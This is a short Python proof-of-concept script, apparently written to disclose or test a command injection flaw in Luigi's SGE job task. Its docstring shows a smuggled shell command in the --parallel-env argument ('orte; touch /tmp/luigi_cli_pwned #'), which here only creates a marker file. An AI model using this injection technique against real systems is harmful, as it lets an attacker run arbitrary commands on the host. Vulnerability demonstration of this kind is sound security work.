#!/usr/bin/env python3
"""
Luigi SGE Command Injection - CLI demonstration.
Run with a malicious --parallel-env to trigger injection:

    python3 test_sge_cli.py VulnerableTask \
        --parallel-env 'orte; touch /tmp/luigi_cli_pwned #' \
        --local-scheduler
"""
import luigi
import tempfile
from luigi.contrib.sge import SGEJobTask


class VulnerableTask(SGEJobTask):

    def _init_local(self):
        # Minimal setup: create temp dir only.
        # Full _init_local() pickles the class for the SGE node, which is
        # unrelated to the injection and requires SGE infrastructure.
        self.tmp_dir = tempfile.mkdtemp()

    def work(self):
        pass

    def output(self):
        return luigi.LocalTarget('/tmp/vulnerable_task_output')


if __name__ == '__main__':
    luigi.run()
